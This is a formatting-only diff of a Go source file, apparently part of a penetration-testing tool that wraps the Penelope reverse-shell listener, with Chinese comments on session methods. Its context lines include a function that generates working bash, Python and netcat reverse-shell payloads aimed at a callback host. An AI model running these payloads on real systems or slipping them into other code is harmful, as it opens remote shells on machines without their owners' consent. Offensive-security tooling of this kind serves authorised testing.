@@ -14,9 +14,9 @@
 //     exec_in_session{session_id,command} → {"output":"…"}(stdout/stderr 已合并)
 //     kill_session{session_id} → {"ok":true}
 //     upload_to_session{session_id,local_path,remote_path?} → {"uploaded":[…]},
-//       remote_path 必须是【目录】(默认会话 cwd),文件名取本地文件 basename
+//     remote_path 必须是【目录】(默认会话 cwd),文件名取本地文件 basename
 //     download_from_session{session_id,remote_path} → {"downloaded":[本地绝对路径]},
-//       落 ~/.penelope/sessions/<name>/downloads/ 下
+//     落 ~/.penelope/sessions/<name>/downloads/ 下
 //   - 文件传输要求持久 shell(agent 或 auto-upgrade 后的 PTY),否则返回 error;
 //     未知会话是 JSON-RPC -32602;会话死亡即从 list_sessions 消失(watchdog 依据)。
 //   - penelope 无回连口令:监听默认只绑 127.0.0.1,目标直连回连时 reverse_listen
@@ -177,9 +177,9 @@ func diffPenSessions(active []int, known map[int]int64) (newIDs []int, dead map[
 // reversePayloads 生成常用回连 payload(host=ARTEX_CALLBACK_ADDR 的主机部分)。
 func reversePayloads(host string, port int) map[string]string {
 	return map[string]string{
-		"bash": fmt.Sprintf("bash -i >& /dev/tcp/%s/%d 0>&1", host, port),
+		"bash":   fmt.Sprintf("bash -i >& /dev/tcp/%s/%d 0>&1", host, port),
 		"python": fmt.Sprintf(`python3 -c 'import socket,os,pty;s=socket.socket();s.connect((%q,%d));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'`, host, port),
-		"nc": fmt.Sprintf("rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc %s %d >/tmp/f", host, port),
+		"nc":     fmt.Sprintf("rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc %s %d >/tmp/f", host, port),
 	}
 }
 
@@ -536,9 +536,9 @@ func (h *PenelopeHandler) registerPenSession(ctx context.Context, penID int) err
 		lang = strings.ToLower(ps.OS)
 	}
 	rec := &db.SessionRecord{
-		Kind:  "reverse",
-		URL:   fmt.Sprintf("reverse://%s", net.JoinHostPort(ps.IP, fmt.Sprint(ps.Port))),
-		Lang:  lang,
+		Kind:   "reverse",
+		URL:    fmt.Sprintf("reverse://%s", net.JoinHostPort(ps.IP, fmt.Sprint(ps.Port))),
+		Lang:   lang,
 		Secret: secret,
 		Status: db.SessionAlive, CreatedByTask: taskID, CreatedByIntent: intentID,
 	}
